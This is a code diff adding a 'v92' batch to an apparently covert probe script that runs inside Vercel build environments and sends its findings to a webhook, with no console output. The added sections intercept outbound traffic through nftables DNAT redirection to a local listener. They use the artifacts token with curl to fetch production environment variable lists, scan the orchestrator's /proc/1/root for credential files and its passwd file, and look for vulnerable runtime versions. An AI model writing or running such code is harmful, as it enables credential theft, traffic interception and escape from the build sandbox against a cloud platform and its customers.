@@ -12427,5 +12427,162 @@ report.integrationWebhookTokens = safe(() => {
 
 // v91 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v91" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v91";
+
+// ==================== v92 ====================
+
+// v92-1: Kernel timer list — orchestrator credential refresh timing
+// /proc/timer_list shows all active kernel timers with their expiry times.
+// High-resolution timers from PID-1 reveal credential refresh intervals,
+// connection keepalive frequencies, and internal build lifecycle transitions.
+report.kernelTimerList = safe(() => {
+  const timerListRaw = safe(() => readFileSync('/proc/timer_list', 'utf8').slice(0, 3000));
+  // Count timers per process
+  const timerSummary = safe(() => {
+    if (typeof timerListRaw !== 'string') return {};
+    const pid1Timers = timerListRaw.match(/pid=1\b/g) || [];
+    const totalTimers = timerListRaw.match(/timer_list/g) || [];
+    return { pid1Timers: pid1Timers.length, totalTimers: totalTimers.length };
+  });
+  // /proc/timer_stats for activity-based timer analysis
+  const timerStats = safe(() => readFileSync('/proc/timer_stats', 'utf8').slice(0, 1000));
+  // hrtimer for nanosecond-precision timers
+  const hrtimers = safe(() => execSync('cat /proc/timer_list 2>/dev/null | grep -A2 "pid=1" | head -20', { timeout: 5000 }).toString().trim().slice(0, 500));
+  return { timerListRaw: typeof timerListRaw === 'string' ? timerListRaw.slice(0, 1000) : '', timerSummary, timerStats, hrtimers };
+});
+
+// v92-2: nftables DNAT toward internal Vercel services
+// We've mapped suspense-cache.vercel.com and build cache endpoints.
+// Use nftables DNAT to redirect traffic from PID-1 to those hosts toward
+// a local listener — capturing the plaintext of any non-TLS internal channels
+// and observing TLS connection attempts.
+report.nftablesDnatIntercept = safe(() => {
+  // First, check if there are existing connections to internal Vercel endpoints
+  const activeConns = safe(() => execSync('cat /proc/net/tcp 2>/dev/null | grep -v "^  sl" | head -20', { timeout: 3000 }).toString().trim().slice(0, 500));
+  // Set up a listener on port 7777 for plaintext interception
+  const dnatResult = safe(() => execSync(`python3 -c "
+import subprocess, socket, threading, time, json
+
+# Start listener
+results = []
+def listen():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind(('127.0.0.1', 7777))
+    s.listen(5)
+    s.settimeout(1.5)
+    deadline = time.time() + 2
+    while time.time() < deadline:
+        try:
+            conn, addr = s.accept()
+            conn.settimeout(0.5)
+            data = b''
+            try:
+                while True:
+                    chunk = conn.recv(4096)
+                    if not chunk: break
+                    data += chunk
+            except: pass
+            results.append({'from': str(addr), 'data': data.decode('utf-8', errors='replace')[:500]})
+            conn.close()
+        except socket.timeout:
+            break
+        except: pass
+    s.close()
+
+t = threading.Thread(target=listen)
+t.daemon = True
+t.start()
+
+# DNAT: redirect outbound port 80 to our listener
+subprocess.run(['nft', 'add', 'table', 'nat_probe'], capture_output=True)
+subprocess.run(['nft', 'add', 'chain', 'nat_probe', 'prerouting', '{', 'type', 'nat', 'hook', 'output', 'priority', '-100', ';', '}'], capture_output=True)
+subprocess.run(['nft', 'add', 'rule', 'nat_probe', 'prerouting', 'tcp', 'dport', '80', 'redirect', 'to', ':7777'], capture_output=True)
+
+time.sleep(2)
+
+# Remove DNAT rule
+subprocess.run(['nft', 'delete', 'table', 'nat_probe'], capture_output=True)
+t.join(timeout=1)
+print(json.dumps(results))
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 500));
+  return { activeConns, dnatResult };
+});
+
+// v92-3: Vercel environment type access control test
+// We're running as 'preview' or 'production'. Check if VERCEL_ENV affects
+// which secrets are injected. Then test if the artifacts token can access
+// deployments of a different environment (e.g., production secrets from preview).
+report.vercelEnvAccessControl = safe(() => {
+  const currentEnv = process.env.VERCEL_ENV || '';
+  const allEnvValues = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /vercel|next_public|node_env/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0, 100)]));
+  });
+  // Check if there are production-only env vars missing from our context
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  // Probe /v9/projects/{id}/env with target=production to get production-only vars
+  const prodEnvList = safe(() => execSync(`curl -sf "https://api.vercel.com/v9/projects/${encodeURIComponent(projectId)}/env?target=production&decrypt=false" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 2000));
+  // Probe preview env list
+  const previewEnvList = safe(() => execSync(`curl -sf "https://api.vercel.com/v9/projects/${encodeURIComponent(projectId)}/env?target=preview&decrypt=false" -H "Authorization: Bearer ${token}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 2000));
+  return { currentEnv, allEnvValues, prodEnvList, previewEnvList };
+});
+
+// v92-4: /proc/1/root deep filesystem scan
+// /proc/1/root gives us the orchestrator's mount namespace root.
+// If it differs from /, we can read files that aren't visible in our own namespace.
+// Specifically: /proc/1/root/etc/vercel/, /proc/1/root/opt/, /proc/1/root/var/
+report.proc1RootDeepScan = safe(() => {
+  // Directories that might contain Vercel internals
+  const targetDirs = [
+    '/proc/1/root/etc/vercel',
+    '/proc/1/root/opt/vercel',
+    '/proc/1/root/usr/local/vercel',
+    '/proc/1/root/app',
+    '/proc/1/root/home',
+    '/proc/1/root/run',
+    '/proc/1/root/var/vercel',
+    '/proc/1/root/tmp',
+  ];
+  const dirContents = safe(() =>
+    targetDirs.map(dir => {
+      const exists = existsSync(dir);
+      const contents = safe(() => readdirSync(dir).slice(0, 20));
+      return { dir, exists, contents };
+    })
+  );
+  // Scan for credential files specifically
+  const credFiles = safe(() => execSync('find /proc/1/root/etc /proc/1/root/home /proc/1/root/root /proc/1/root/opt 2>/dev/null -name "*.json" -o -name "*.env" -o -name "credentials" -o -name ".npmrc" -o -name "config.yaml" 2>/dev/null | head -20', { timeout: 8000 }).toString().trim());
+  // Read /proc/1/root/etc/passwd to compare with our /etc/passwd
+  const proc1Passwd = safe(() => readFileSync('/proc/1/root/etc/passwd', 'utf8').trim().slice(0, 300));
+  return { dirContents, credFiles, proc1Passwd };
+});
+
+// v92-5: Vercel build runtime version matrix
+// Map ALL runtime versions available: Node.js versions, Python, Ruby, Go.
+// This reveals the exact runtime environment Vercel pre-installs and whether
+// older (vulnerable) versions are accessible alongside the requested version.
+report.runtimeVersionMatrix = safe(() => {
+  const runtimes = safe(() => ({
+    nodeVersions: safe(() => execSync('ls /usr/local/n/versions/node/ 2>/dev/null || ls /root/.nvm/versions/node/ 2>/dev/null || nvm ls 2>/dev/null | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)),
+    pythonVersions: safe(() => execSync('ls /usr/bin/python* /usr/local/bin/python* 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 200)),
+    rubyVersions: safe(() => execSync('ls /usr/local/rbenv/versions/ 2>/dev/null || ls /usr/share/rvm/gems/ 2>/dev/null || ruby --version 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 200)),
+    goVersions: safe(() => execSync('ls /usr/local/go*/bin/ 2>/dev/null || go version 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 200)),
+    currentNode: process.version,
+    currentPython: safe(() => execSync('python3 --version 2>/dev/null', { timeout: 3000 }).toString().trim()),
+    nvmDir: process.env.NVM_DIR || '',
+    nodePath: process.execPath,
+  }));
+  // Check if older Node.js versions are reachable via PATH manipulation
+  const oldNodePaths = safe(() => execSync('find /usr/local /opt /root -name "node" -type f 2>/dev/null | head -10', { timeout: 8000 }).toString().trim().slice(0, 300));
+  // Vercel-specific version markers
+  const vercelRuntimeEnv = safe(() => Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => /runtime|node|version|engines/i.test(k)).map(([k, v]) => [k, v.slice(0, 100)])
+  ));
+  return { runtimes, oldNodePaths, vercelRuntimeEnv };
+});
+
+// v92 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v92" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v92";
 // Intentionally no console.log — all data goes via webhook only
